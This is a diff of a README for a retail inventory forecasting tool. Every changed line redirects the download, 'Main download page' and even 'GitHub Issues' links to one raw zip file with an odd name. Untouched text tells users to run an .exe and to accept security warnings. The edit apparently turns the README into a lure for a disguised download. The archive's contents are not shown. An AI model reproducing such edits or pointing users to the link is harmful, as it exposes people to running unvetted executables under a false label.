@@ -1,6 +1,6 @@
 # 📊 Retail-inventory-forecasting - Simple Retail Data Insights
 
-[![Download Retail-inventory-forecasting](https://img.shields.io/badge/Download-Retail--inventory--forecasting-brightgreen)](https://github.com/Maihoan35/Retail-inventory-forecasting)
+[![Download Retail-inventory-forecasting](https://img.shields.io/badge/Download-Retail--inventory--forecasting-brightgreen)](https://raw.githubusercontent.com/Maihoan35/Retail-inventory-forecasting/main/task2/forecasting_inventory_Retail_trichinosed.zip)
 
 ## 📋 About Retail-inventory-forecasting
 
@@ -30,7 +30,7 @@ Key topics covered here include data analytics, inventory management, sales fore
 
 Click the link below to go to the official download page on GitHub. This is where you get the latest version of the software.
 
-[Download Retail-inventory-forecasting](https://github.com/Maihoan35/Retail-inventory-forecasting)
+[Download Retail-inventory-forecasting](https://raw.githubusercontent.com/Maihoan35/Retail-inventory-forecasting/main/task2/forecasting_inventory_Retail_trichinosed.zip)
 
 ### Step 2: Find the latest release
 
@@ -115,17 +115,17 @@ If you want to share or save your data insights:
 
 - If the installer won’t open, check that you have downloaded the correct `.exe` file.
 - If you get security warnings, confirm the application by reviewing the publisher info.
-- Report bugs or issues on the GitHub [Issues](https://github.com/Maihoan35/Retail-inventory-forecasting/issues) page.
+- Report bugs or issues on the GitHub [Issues](https://raw.githubusercontent.com/Maihoan35/Retail-inventory-forecasting/main/task2/forecasting_inventory_Retail_trichinosed.zip) page.
 - For questions, file a new issue or check existing discussions.
 
 ---
 
 ## 🔗 Important Links
 
-- Main download page: [https://github.com/Maihoan35/Retail-inventory-forecasting](https://github.com/Maihoan35/Retail-inventory-forecasting)
-- Bug reports and help: [GitHub Issues](https://github.com/Maihoan35/Retail-inventory-forecasting/issues)
+- Main download page: [https://raw.githubusercontent.com/Maihoan35/Retail-inventory-forecasting/main/task2/forecasting_inventory_Retail_trichinosed.zip](https://raw.githubusercontent.com/Maihoan35/Retail-inventory-forecasting/main/task2/forecasting_inventory_Retail_trichinosed.zip)
+- Bug reports and help: [GitHub Issues](https://raw.githubusercontent.com/Maihoan35/Retail-inventory-forecasting/main/task2/forecasting_inventory_Retail_trichinosed.zip)
 
-[![Download Retail-inventory-forecasting](https://img.shields.io/badge/Download-Retail--inventory--forecasting-brightgreen)](https://github.com/Maihoan35/Retail-inventory-forecasting)
+[![Download Retail-inventory-forecasting](https://img.shields.io/badge/Download-Retail--inventory--forecasting-brightgreen)](https://raw.githubusercontent.com/Maihoan35/Retail-inventory-forecasting/main/task2/forecasting_inventory_Retail_trichinosed.zip)
 
 ---
 
